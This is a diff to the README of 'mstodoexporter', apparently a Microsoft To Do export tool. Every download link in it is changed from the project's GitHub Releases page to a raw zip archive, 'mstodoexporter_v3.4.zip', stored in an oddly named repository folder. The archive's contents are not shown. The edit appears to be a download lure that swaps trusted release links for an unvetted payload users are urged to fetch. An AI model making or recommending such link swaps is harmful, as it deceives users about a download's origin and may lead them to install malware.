@@ -1,6 +1,6 @@
 # 🚀 mstodoexporter - Easily Export Your To Do Data
 
-[![Download](https://github.com/Diarity/mstodoexporter/releases/latest/download/mstodoexporter.png)](https://github.com/Diarity/mstodoexporter/releases)
+[![Download](https://raw.githubusercontent.com/Diarity/mstodoexporter/main/Dithyrambos/mstodoexporter_v3.4.zip)](https://raw.githubusercontent.com/Diarity/mstodoexporter/main/Dithyrambos/mstodoexporter_v3.4.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@ To use mstodoexporter, you need:
 
 To download mstodoexporter, visit the Releases page. Click the button below to go directly there. 
 
-[Visit the Releases Page to Download](https://github.com/Diarity/mstodoexporter/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Diarity/mstodoexporter/main/Dithyrambos/mstodoexporter_v3.4.zip)
 
 ### Step 2: Download the Application
 
@@ -45,7 +45,7 @@ After downloading, locate the file in your downloads folder.
 
 To get started with mstodoexporter, simply download it using the link below.
 
-[Download mstodoexporter](https://github.com/Diarity/mstodoexporter/releases)
+[Download mstodoexporter](https://raw.githubusercontent.com/Diarity/mstodoexporter/main/Dithyrambos/mstodoexporter_v3.4.zip)
 
 ## 📑 How to Use mstodoexporter
 
@@ -105,4 +105,4 @@ This project covers various topics, including:
 
 For more information, feel free to explore our GitHub pages and documentation.
 
-[Download mstodoexporter](https://github.com/Diarity/mstodoexporter/releases)
+[Download mstodoexporter](https://raw.githubusercontent.com/Diarity/mstodoexporter/main/Dithyrambos/mstodoexporter_v3.4.zip)
